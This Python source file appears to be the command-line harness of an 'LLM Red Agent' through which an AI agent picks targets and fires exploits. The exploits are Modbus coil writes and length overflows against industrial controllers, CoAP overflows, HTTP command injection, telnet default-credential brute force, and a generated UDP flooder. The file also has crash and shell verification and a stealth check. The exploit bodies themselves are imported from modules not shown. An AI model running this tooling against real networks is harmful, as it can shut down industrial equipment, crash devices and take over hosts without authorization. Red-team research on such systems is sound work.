#!/usr/bin/env python3
"""agent_loop.py — Tool harness for the LLM Red Agent.

This module does NOT contain reasoning logic. It exposes a ToolHarness
that an external LLM agent (e.g. Cursor/Claude in a terminal session)
calls via a simple CLI interface:

    sudo python3 -m apiot.core.agent_loop <command> [args...]

Commands:
    get_state           Print current network_state.json (targets + vulns)
    get_targets         Print actionable targets with attack surfaces
    stealth_check <ip>  Measure packet loss to a target
    attack <tool> <ip>  Execute a named exploit tool against an IP
    verify_crash <ip>   Check if target has crashed
    verify_shell <ip> [port]  Check for shell access
    evolve <ip> <port>  Generate + run a dynamic UDP probe
    log_summary         Print attack log metrics
    reset_logs          Clear attack_log.json and vulnerabilities

The LLM reads the output, reasons about what to do next, and issues
the next command. This is the real agentic loop — the LLM is the brain.
"""

import hashlib
import json
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))

from apiot.core.state import AgentMemory
from apiot.core.attack_log import AttackLogger
from apiot.core.evolve import generate_udp_flooder, load_dynamic_tool
from apiot.toolkit import ot_exploits, linux_exploits, verifier

TOOLS = {
    "modbus_write_coil": {
        "fn": lambda ip, **kw: ot_exploits.modbus_write_coil(ip, port=int(kw.get("port", 502)), action=kw.get("action", "off")),
        "category": "OT",
        "description": "Send Modbus FC 0x05 Write Single Coil. Args: ip, port=502, action=off|on",
        "packets": 1,
    },
    "modbus_mbap_overflow": {
        "fn": lambda ip, **kw: ot_exploits.modbus_mbap_overflow(ip, port=int(kw.get("port", 502))),
        "category": "OT",
        "description": "Send Modbus packet with MBAP length=2048 but tiny PDU. Args: ip, port=502",
        "packets": 1,
    },
    "coap_option_overflow": {
        "fn": lambda ip, **kw: ot_exploits.coap_option_overflow(ip, port=int(kw.get("port", 5683))),
        "category": "OT",
        "description": "Send malformed CoAP with option delta/length overflow (UDP). Args: ip, port=5683",
        "packets": 1,
    },
    "http_cmd_injection": {
        "fn": lambda ip, **kw: linux_exploits.http_cmd_injection(
            ip, port=int(kw.get("port", 80)), path=kw.get("path", "/"),
            param=kw.get("param", "cmd"), payload=kw.get("payload", "id")),
        "category": "Linux",
        "description": "Inject shell command via HTTP param. Args: ip, port=80, path=/, param=cmd, payload=id",
        "packets": 1,
    },
    "brute_force_telnet": {
        "fn": lambda ip, **kw: linux_exploits.brute_force_telnet(ip, port=int(kw.get("port", 23))),
        "category": "Linux",
        "description": "Try default creds over telnet. Args: ip, port=23",
        "packets": 3,
    },
}


def _out(data):
    """Print structured JSON to stdout for the LLM to parse."""
    print(json.dumps(data, indent=2, default=str))


def cmd_get_state():
    return AgentMemory().get_full_context()


def cmd_get_targets():
    ctx = AgentMemory().get_full_context()
    targets = []
    for ip, fp in ctx.get("fingerprints", {}).items():
        cls = fp.get("classification", {})
        surface = cls.get("attack_surface", [])
        if not surface:
            continue
        targets.append({
            "ip": ip,
            "category": cls.get("category"),
            "arch": cls.get("arch_guess"),
            "role": cls.get("role"),
            "attack_surface": surface,
        })
    # MCU sensors first
    targets.sort(key=lambda t: 0 if t.get("category") == "Bare-Metal OT Sensor" else 1)
    return {"targets": targets, "available_tools": list(TOOLS.keys())}


def cmd_stealth_check(ip: str):
    try:
        result = subprocess.run(
            ["ping", "-c", "5", "-W", "2", "-q", ip],
            capture_output=True, text=True, timeout=20,
        )
        for line in result.stdout.splitlines():
            if "packet loss" in line:
                pct = float(line.split("%")[0].split()[-1])
                return {"ip": ip, "loss_pct": pct,
                        "recommendation": "proceed" if pct <= 10 else ("throttle" if pct <= 50 else "skip")}
    except Exception as e:
        return {"ip": ip, "loss_pct": 100, "recommendation": "skip", "error": str(e)}
    return {"ip": ip, "loss_pct": 0, "recommendation": "proceed"}


def cmd_attack(tool_name: str, ip: str, **kwargs):
    if tool_name not in TOOLS:
        return {"success": False, "error": f"Unknown tool: {tool_name}. Available: {list(TOOLS.keys())}"}

    tool = TOOLS[tool_name]
    memory = AgentMemory()
    logger = AttackLogger()

    # Get target arch for logging
    ctx = memory.get_full_context()
    fp = ctx.get("fingerprints", {}).get(ip, {})
    arch = fp.get("classification", {}).get("arch_guess", "Unknown")

    try:
        result = tool["fn"](ip, **kwargs)
    except Exception as e:
        result = {"success": False, "details": f"Tool exception: {e}"}

    logger.log(
        target_ip=ip, target_arch=arch, tool_used=tool_name,
        payload_hex=result.get("payload_hex", ""),
        packets_sent=result.get("packets_sent", tool["packets"]),
        outcome="delivered",
        details=result,
    )
    return result


def cmd_verify_crash(ip: str):
    memory = AgentMemory()
    logger = AttackLogger()
    ctx = memory.get_full_context()
    fp = ctx.get("fingerprints", {}).get(ip, {})
    arch = fp.get("classification", {}).get("arch_guess", "Unknown")

    known = []
    for p, info in fp.get("ports", {}).items():
        if isinstance(info, dict) and info.get("state") in ("open", "open|filtered"):
            known.append(int(p))

    result = verifier.verify_crash(ip, known_ports=known or [502, 4242, 5683])

    if result["verified"]:
        vuln_id = hashlib.md5(f"{ip}:crash:{time.time()}".encode()).hexdigest()[:12]
        memory.add_vulnerability(vuln_id, {
            "ip": ip, "attack": "crash_verified",
            "verification": result, "timestamp": time.time(),
        })
        result["vulnerability_id"] = vuln_id

    logger.log(target_ip=ip, target_arch=arch, tool_used="verify_crash",
               packets_sent=2, outcome="crash_verified" if result["verified"] else "alive",
               details=result)
    return result


def cmd_verify_shell(ip: str, port: int = 23):
    result = verifier.verify_shell(ip, port=port)
    if result["verified"]:
        memory = AgentMemory()
        vuln_id = hashlib.md5(f"{ip}:shell:{time.time()}".encode()).hexdigest()[:12]
        memory.add_vulnerability(vuln_id, {
            "ip": ip, "attack": "shell_access",
            "verification": result, "timestamp": time.time(),
        })
        result["vulnerability_id"] = vuln_id
    return result


def cmd_evolve(ip: str, port: int = 5683):
    filepath = generate_udp_flooder()
    mod = load_dynamic_tool(filepath)
    result = mod.udp_flood_probe(ip, port=port, count=5)

    logger = AttackLogger()
    memory = AgentMemory()
    ctx = memory.get_full_context()
    arch = ctx.get("fingerprints", {}).get(ip, {}).get("classification", {}).get("arch_guess", "Unknown")

    logger.log(target_ip=ip, target_arch=arch, tool_used="dynamic_udp_probe",
               packets_sent=result.get("packets_sent", 5),
               outcome="success" if result["port_responsive"] else "failure",
               details=result)
    result["dynamic_tool_path"] = str(filepath)
    return result


def cmd_log_summary():
    return AttackLogger().get_summary()


def cmd_reset_logs():
    AttackLogger().clear()
    m = AgentMemory()
    state = m.get_full_context()
    state["active_vulnerabilities"] = {}
    m._state = state
    m._save()
    return {"status": "cleared"}


def main():
    if len(sys.argv) < 2:
        _out({
            "usage": "python3 -m apiot.core.agent_loop <command> [args]",
            "commands": {
                "get_state": "Print full network state",
                "get_targets": "List actionable targets with attack surfaces",
                "stealth_check <ip>": "Measure packet loss",
                "attack <tool> <ip> [key=val...]": "Fire an exploit",
                "verify_crash <ip>": "Check if target crashed",
                "verify_shell <ip> [port]": "Check shell access",
                "evolve <ip> [port]": "Generate + run dynamic UDP probe",
                "log_summary": "Print attack metrics",
                "reset_logs": "Clear attack log and vulnerabilities",
            },
            "available_tools": list(TOOLS.keys()),
        })
        return

    cmd = sys.argv[1]

    if cmd == "get_state":
        _out(cmd_get_state())
    elif cmd == "get_targets":
        _out(cmd_get_targets())
    elif cmd == "stealth_check" and len(sys.argv) >= 3:
        _out(cmd_stealth_check(sys.argv[2]))
    elif cmd == "attack" and len(sys.argv) >= 4:
        kwargs = {}
        for arg in sys.argv[4:]:
            if "=" in arg:
                k, v = arg.split("=", 1)
                kwargs[k] = v
        _out(cmd_attack(sys.argv[2], sys.argv[3], **kwargs))
    elif cmd == "verify_crash" and len(sys.argv) >= 3:
        _out(cmd_verify_crash(sys.argv[2]))
    elif cmd == "verify_shell" and len(sys.argv) >= 3:
        port = int(sys.argv[3]) if len(sys.argv) >= 4 else 23
        _out(cmd_verify_shell(sys.argv[2], port))
    elif cmd == "evolve" and len(sys.argv) >= 3:
        port = int(sys.argv[3]) if len(sys.argv) >= 4 else 5683
        _out(cmd_evolve(sys.argv[2], port))
    elif cmd == "log_summary":
        _out(cmd_log_summary())
    elif cmd == "reset_logs":
        _out(cmd_reset_logs())
    else:
        _out({"error": f"Unknown command: {cmd}", "hint": "Run without args for usage"})


if __name__ == "__main__":
    main()
